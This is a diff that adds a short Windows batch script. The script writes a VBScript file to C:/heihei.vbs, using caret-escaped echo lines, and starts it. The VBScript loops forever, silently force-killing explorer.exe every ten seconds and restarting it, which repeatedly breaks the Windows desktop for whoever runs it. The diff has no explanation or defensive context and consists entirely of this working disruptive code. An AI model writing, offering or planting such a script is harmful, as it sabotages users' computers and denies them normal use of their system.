@@ -1,0 +1,11 @@
+9
+del /f /q "C:/heihei.vbs"
+echo Dim^ ws >>C:/heihei.vbs
+echo Set^ ws^ ^=^ CreateObject^(^"WScript^.Shell^"^) >>C:/heihei.vbs
+echo do >>C:/heihei.vbs
+echo ws^.run^ ^"TASKKILL^ ^-f^ ^-im^ explorer^.exe^"^,0 >>C:/heihei.vbs
+echo wscript^.sleep^ 10000 >>C:/heihei.vbs
+echo ws^.run^ ^"cmd^ ^/c^ C^:^/WINDOWS^/explorer^.exe^"^,0 >>C:/heihei.vbs
+echo loop >>C:/heihei.vbs
+start c:/heihei.vbs
+
